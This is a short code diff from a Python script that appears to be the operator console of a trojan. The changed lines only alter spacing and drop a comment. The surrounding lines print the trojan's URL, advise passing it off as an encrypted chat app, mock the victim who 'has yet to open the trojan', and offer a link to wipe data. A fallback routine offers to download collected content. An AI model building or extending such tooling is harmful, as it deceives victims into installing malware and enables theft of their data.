@@ -58,14 +58,14 @@ while True:
                                          
 
                       """)
-                print("                                           " + version)
+                print("                                                         " + version)
                 print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n                                         {BLUE}Best way is to make them think it's a encrypted chatting application. {RESET}")
                 print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...\n                                         To wipe data, go to {RESET}" + delete_data)
                 
         else:
             print(f"Received status code {response.status_code}")
     except Exception as e:
-        print(f"Error fetching data, Content might be too large to gather. Download it.: {e}") # Remember to FIX download function
+        print(f"Error fetching data, Content might be too large to gather. Download it.: {e}")
         user_input = input("Download content? Y/N: ")
         if user_input.strip().lower() == 'y':
             try:
